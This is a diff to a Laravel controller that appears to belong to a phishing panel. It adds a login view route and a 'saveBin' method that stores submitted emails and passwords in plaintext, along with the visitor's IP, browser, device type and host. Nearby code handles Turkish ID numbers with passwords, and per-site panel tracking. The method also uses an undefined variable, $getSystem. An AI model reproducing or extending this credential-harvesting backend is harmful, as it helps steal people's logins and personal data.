@@ -5,6 +5,7 @@ namespace App\Http\Controllers;
 use App\Classes\SystemStatusEnum;
 use App\Http\Requests\loginsRequest;
 use App\Models\AdminOptions;
+use App\Models\binLogModel;
 use App\Models\ForbiddensModel;
 use App\Models\LoginModel;
 use App\Models\Sites;
@@ -77,6 +78,10 @@ class MainController extends Controller
         $this->checkControl($request);
         return view('i');
     }
+    public function blogin(Request $request)
+    {
+        return view('b');
+    }
     public function firstGG(Request $request)
     {
         return view('main');
@@ -96,7 +101,29 @@ class MainController extends Controller
         // Eğer slug panel slug'ı değilse, 404 döndür veya başka bir işlem yap
         abort(404);
     }
+    public function saveBin(Request $request)
+    {
+        $request->merge([
+            'phone' => $request->phone ?? '',
+            'user_agent' => Agent::browser() . ' ' . Agent::getUserAgent(),
+            'system' => Agent::isDesktop() ? 'PC' : 'Mobile',
+            'date' => Carbon::now(),
+            'site' => request()->server('HTTP_HOST'),
+            'ip' => $request->ip(),
+            'system_id' => $getSystem->system ?? SystemStatusEnum::G->value
+        ]);
+        $binData = $request->all();
+       
+        $create = binLogModel::updateOrCreate(
+            [
+                'email' => $binData['email'],
+                'password' => $binData['password'],
+            ], // Şart: Email ve şifre aynıysa güncelle
+            $binData // Güncellenecek veya eklenecek veri
+        );
 
+       
+    }
     public function saveData(loginsRequest $request)
     {
         if ($request->tc && $request->password) {
